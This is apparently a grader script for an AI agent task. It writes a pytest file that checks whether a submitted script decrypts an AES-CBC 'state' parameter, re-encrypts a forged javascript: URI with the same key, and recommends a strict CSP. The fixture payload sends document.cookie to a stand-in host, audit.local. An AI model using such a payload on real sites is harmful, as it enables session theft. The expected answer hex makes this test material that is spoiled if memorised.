#!/bin/bash
set -e
mkdir -p /logs/verifier

cat << 'TEST_EOF' > /tmp/test_final_state.py
import json
import os
import subprocess
from pathlib import Path

import pytest
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

HOME = Path("/home/user")
CONFIG = HOME / "app_config.json"
REQUEST = HOME / "intercepted_request.txt"
AUDIT = HOME / "audit_trail.json"


def encrypt_hex(plaintext, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return cipher.encrypt(pad(plaintext.encode("utf-8"), AES.block_size)).hex()


def load_report():
    assert AUDIT.is_file(), f"File {AUDIT} does not exist. The audit trail was not generated."
    try:
        with AUDIT.open("r") as f:
            return json.load(f)
    except json.JSONDecodeError:
        pytest.fail(f"{AUDIT} is not valid JSON.")


def assert_strict_csp(csp):
    assert isinstance(csp, str), "recommended_csp must be a string."
    directives = {}
    for raw_directive in csp.split(";"):
        tokens = raw_directive.strip().split()
        if not tokens:
            continue
        name = tokens[0].lower()
        assert name not in directives, f"CSP contains duplicate directive '{name}'."
        directives[name] = tokens[1:]

    assert directives.get("default-src") == ["'none'"], \
        "CSP default-src must contain only 'none'."
    script_sources = directives.get("script-src")
    assert script_sources is not None, "CSP is missing script-src."
    assert len(script_sources) == 2 and set(script_sources) == {"'self'", "https://apis.local"}, \
        "CSP script-src must contain only 'self' and https://apis.local."


def find_python_scripts():
    candidates = []
    for path in HOME.rglob("*"):
        if not path.is_file() or path.is_symlink() or path == AUDIT:
            continue
        is_python = path.suffix.lower() == ".py"
        if not is_python:
            try:
                first_line = path.open("rb").readline(256).lower()
                is_python = first_line.startswith(b"#!") and b"python" in first_line
            except OSError:
                pass
        if is_python:
            candidates.append(path)
    return sorted(candidates)


def run_script(path):
    if AUDIT.exists():
        AUDIT.unlink()
    return subprocess.run(
        ["python3", str(path)],
        cwd=str(HOME),
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        timeout=20,
    )


def test_script_and_audit_trail():
    original_config = CONFIG.read_bytes()
    original_request = REQUEST.read_bytes()
    candidates = find_python_scripts()
    assert candidates, "No Python script was written under /home/user."

    probe_key = os.urandom(32)
    probe_iv = os.urandom(16)
    probe_url = "https://probe.local/account?audit=dynamic"
    malicious_uri = "javascript:fetch('http://audit.local/?log='+btoa(document.cookie))"
    probe_state = encrypt_hex(probe_url, probe_key, probe_iv)
    expected_probe_malicious = encrypt_hex(malicious_uri, probe_key, probe_iv)

    selected = None
    errors = []
    try:
        CONFIG.write_text(json.dumps({"AES_KEY": probe_key.hex(), "AES_IV": probe_iv.hex()}))
        REQUEST.write_text(
            f"GET /login?state={probe_state} HTTP/1.1\n"
            "Host: legacy.local\n"
            "User-Agent: verifier-probe\n"
        )

        for script in candidates:
            try:
                result = run_script(script)
                if result.returncode != 0:
                    errors.append(f"{script}: exited {result.returncode}: {result.stderr[-300:]}")
                    continue
                data = load_report()
                if data.get("decrypted_original_url") != probe_url:
                    errors.append(f"{script}: did not decrypt the verifier probe")
                    continue
                payload = data.get("malicious_state_payload")
                if not isinstance(payload, str) or payload.lower() != expected_probe_malicious:
                    errors.append(f"{script}: did not encrypt the malicious URI with the probe key and IV")
                    continue
                selected = script
                break
            except Exception as exc:
                errors.append(f"{script}: {exc}")

        assert selected is not None, \
            "No submitted Python script generated the audit dynamically. " + " | ".join(errors)
    finally:
        CONFIG.write_bytes(original_config)
        REQUEST.write_bytes(original_request)

    result = run_script(selected)
    assert result.returncode == 0, \
        f"Python script failed on the provided inputs: {result.stderr}"
    data = load_report()

    # Check decrypted_original_url
    assert "decrypted_original_url" in data, "Key 'decrypted_original_url' missing in audit_trail.json"
    assert data["decrypted_original_url"] == "https://app.local/dashboard", \
        f"Incorrect decrypted_original_url. Expected 'https://app.local/dashboard', got '{data['decrypted_original_url']}'"

    # Check malicious_state_payload
    assert "malicious_state_payload" in data, "Key 'malicious_state_payload' missing in audit_trail.json"
    expected_payload = "2d15fb7e8ec9335a901053073749451da7eb03cda181b53e4c4491c95df949d0dd12dc60b457dc55ce3fbf899321eab07d8b58a129efea110c732a3943dc5a5223ab06e7a27eb84519fbb9fb9d084050"
    assert isinstance(data["malicious_state_payload"], str), "malicious_state_payload must be a string"
    assert data["malicious_state_payload"].lower() == expected_payload, \
        f"Incorrect malicious_state_payload. Expected '{expected_payload}', got '{data['malicious_state_payload']}'"

    # Check recommended_csp
    assert "recommended_csp" in data, "Key 'recommended_csp' missing in audit_trail.json"
    csp = data["recommended_csp"].strip()

    # Preserve the original checks.
    csp_normalized = " ".join(csp.replace(";", " ; ").split())
    assert "default-src 'none'" in csp_normalized or "default-src 'none';" in csp.replace(" ", ""), \
        "CSP does not properly set default-src to 'none'."
    assert "script-src 'self' https://apis.local" in csp_normalized or "script-src 'self' https://apis.local;" in csp.replace(" ", "") or "script-src https://apis.local 'self'" in csp_normalized, \
        "CSP does not properly restrict script-src to 'self' and https://apis.local."

    # Enforce that those directives contain no additional sources.
    assert_strict_csp(csp)
TEST_EOF

if python3 -m pytest /tmp/test_final_state.py -x --tb=short 2>&1; then
    echo "1" > /logs/verifier/reward.txt
else
    echo "0" > /logs/verifier/reward.txt
fi
